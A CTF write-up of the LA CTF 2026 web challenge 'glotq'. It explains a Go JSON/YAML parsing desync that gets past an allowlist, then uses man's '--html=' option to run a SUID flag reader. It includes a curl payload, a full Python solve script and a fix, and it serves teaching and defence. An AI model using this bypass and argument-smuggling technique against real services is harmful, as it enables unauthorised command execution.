---
title: "[Web] glotq"
description: Writeup for "glotq" from LA CTF 2026.
date: 2026-02-10 01:00:00 +0900
categories: [CTF, LA CTF 2026]
tags: [Web]
toc: true
comments: false
---

## TL;DR

glotq is a service that runs `jq`, `yq`, `xq`, or `man` on the server.
The flag is at `/flag.txt` (root-only), but a SUID binary `/readflag` can read it for us.

The bug is a **parsing desync**: the `/yaml` endpoint validates the request using a JSON parser, but executes it using a YAML parser. By sending a single body that looks different to each parser, we can **pass validation as `yq` but actually run `man`**.

Once we're running `man`, we use its `--html=<browser>` option to execute `/readflag` as the "browser", which reads and outputs the flag.

---

## Overview

| Endpoint | Parser used |
|---|---|
| `POST /json` | `json.Unmarshal` |
| `POST /yaml` | `yaml.Unmarshal` |
| `POST /xml` | `xml.Unmarshal` |

A `SecurityMiddleware` checks every request **before** it reaches the handler. It picks a parser based on `Content-Type`, validates the `command` and `args` against an allowlist, then passes the **original raw body** to the handler.

The handler then parses the body again with its **own** parser â€” and this is where the desync happens.

---

## Root Cause â€” Parsing Desync

If we send `Content-Type: application/json` to `/yaml`:

- **Middleware** â†’ parses with JSON parser â†’ sees `Command: yq` âœ… (passes allowlist)
- **Handler** â†’ parses with YAML parser â†’ sees `command: man` ðŸš¨ (runs man instead)

**Why does the same body look different to each parser?**

Go's `encoding/json` does **case-insensitive** field matching. So both `"command"` and `"Command"` map to the same struct field, and the **last one wins**.

Go's YAML library matches fields by their `yaml:` struct tags (lowercase). So it only picks up `"command"` and ignores `"Command"`.

By putting **both** `"command"/"args"` and `"Command"/"Args"` in the JSON body:

| Parser | Sees |
|---|---|
| JSON (middleware) | `Command=yq`, `Args=["."]` (last wins) |
| YAML (handler) | `command=man`, `args=["--html=/readflag","jq"]` |

---

## Exploit

### Why `man --html=/readflag`?

`man` has an option `--html=<browser>` that launches an external program to display HTML output.
Whatever you put as `<browser>` gets executed as a command â€” so we pass `/readflag`, which is a SUID root binary that reads `/flag.txt`.

### Payload (one request)

```bash
curl -sS -X POST "http://<TARGET>/yaml" \
  -H "Content-Type: application/json" \
  --data-binary '{"command":"man","args":["--html=/readflag","jq"],"Command":"yq","Args":["."]}'
```

The response will contain the flag.

---

## Flag

```
lactf{PoLY9LOt_TH3_Fl49}
```

---

## solve.py

```python
#!/usr/bin/env python3
import argparse, json, re, sys, requests

FLAG_RE = re.compile(r"lactf\{[^}]+\}")

def solve(base: str, timeout: float = 10.0) -> str:
    url = base.rstrip("/") + "/yaml"
    payload = {
        "command": "man",
        "args": ["--html=/readflag", "jq"],
        "Command": "yq",
        "Args": ["."],
    }
    r = requests.post(url,
                      headers={"Content-Type": "application/json"},
                      data=json.dumps(payload),
                      timeout=timeout)
    r.raise_for_status()

    try:
        j = r.json()
        text = (j.get("output") or "") + "\n" + (j.get("error") or "")
    except Exception:
        text = r.text

    m = FLAG_RE.search(text)
    if not m:
        raise RuntimeError(f"Flag not found in response:\n{text[:300]}")
    return m.group(0)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. https://glotq-xxx.instancer.lac.tf")
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()
    try:
        print(solve(args.base, args.timeout))
    except Exception as e:
        sys.exit(f"[!] {e}")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
python3 solve.py --base "https://glotq-xxx.instancer.lac.tf"
```

---

## Notes

- This is a **Parsing Desync** attack â€” the same request body is parsed differently by two different parsers at validation and execution time.
- The fix is simple: parse the body **once**, and pass the already-parsed struct to both the middleware and the handler. Never re-parse the raw body.
